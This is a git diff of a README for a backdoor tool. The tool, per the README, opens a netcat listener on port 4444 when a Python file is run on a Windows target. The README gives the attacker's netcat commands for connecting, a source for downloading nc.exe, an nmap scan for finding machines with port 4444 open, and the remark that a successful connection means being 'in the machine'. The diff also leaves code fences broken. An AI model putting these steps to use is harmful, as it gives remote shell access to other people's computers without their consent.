@@ -47,7 +47,7 @@ This tool is designed to:
 - This is the command that triggers the backdoor in our Window machine (Runs automatically on running the Python file).
    ```bash
    nc64 -lvp 4444
-   ```
+   
 - The command attacker needs to run in their machines.
   - For Linux
     ```bash
@@ -56,6 +56,7 @@ This tool is designed to:
   - For Windows
     ```bash
     nc64 <ip_address_of _the_target_machine> 4444
+    
    - For windows users, you can download `netcat` tool from [this repository](https://github.com/int0x33/nc.exe/)
    - In Linux, the netcat comes preinstalled.
 
@@ -78,7 +79,7 @@ This will list all the IP addresses in a network and we have to find our target 
 ```bash
 nmap -p 4444 <ip_address>
 ```
-
+If we find the port number 4444 open for any IP address, it maybe our target machine. Just try to connect using the netcat command if its successful the we're in the machine.
 
 
 6. Enjoy responsibly (or face karmic doom).
